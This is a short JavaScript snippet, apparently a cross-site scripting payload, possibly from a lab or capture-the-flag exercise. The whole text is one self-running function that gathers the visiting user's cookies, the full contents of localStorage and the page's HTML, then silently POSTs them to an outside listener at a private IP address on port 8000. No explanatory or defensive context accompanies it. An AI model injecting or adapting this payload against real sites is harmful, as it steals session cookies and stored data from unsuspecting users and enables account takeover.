(() => {
  const data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    html: document.documentElement.outerHTML,
  };

  fetch("http://172.16.12.14:8000", {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
})();
